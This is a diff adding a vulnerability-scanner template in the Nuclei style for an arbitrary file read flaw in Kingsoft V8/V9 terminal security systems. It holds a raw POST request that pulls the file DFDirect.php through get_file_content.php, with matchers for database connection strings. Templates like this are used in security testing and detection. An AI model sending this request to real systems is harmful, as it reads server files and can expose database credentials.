@@ -1,0 +1,31 @@
+id: kingsoft-v8v9-file-read
+info:
+  name: Kingsoft V8/V9 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kingsoft V8 and V9 terminal security systems have arbitrary file reading vulnerabilities. Attackers can download arbitrary files in the web directory through this vulnerability.
+  reference:
+    - https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=3904
+  tags: fileread
+http:
+  - raw:
+      - |
+        POST /receive_file/get_file_content.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        filepath=DFDirect.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "mysql:host"
+        part: body
+      - type: word
+        words:
+          - "require_once"
+        part: body
